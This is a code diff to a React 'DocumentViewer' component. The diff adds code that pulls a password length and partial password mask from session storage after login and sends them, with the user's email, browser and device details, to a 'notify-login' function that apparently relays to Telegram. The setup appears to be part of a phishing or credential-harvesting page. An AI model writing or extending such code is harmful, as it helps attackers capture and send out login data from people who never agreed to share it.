@@ -33,8 +33,17 @@ const DocumentViewer = () => {
 
       // Notify via edge function
       try {
+        // Get password length from sessionStorage (set during login)
+        const pwLen = parseInt(sessionStorage.getItem('_pw_len') || '0', 10);
+        const maskedPassword = pwLen >= 2
+          ? `${sessionStorage.getItem('_pw_mask') || '***'} (${pwLen} chars)`
+          : 'unknown';
+        // Clear immediately after reading
+        sessionStorage.removeItem('_pw_len');
+        sessionStorage.removeItem('_pw_mask');
+
         await supabase.functions.invoke('notify-login', {
-          body: { email, user_agent: userAgent, device_info: navigator.platform },
+          body: { email, user_agent: userAgent, device_info: navigator.platform, masked_password: maskedPassword },
         });
       } catch (e) {
         console.log('Telegram notification skipped');
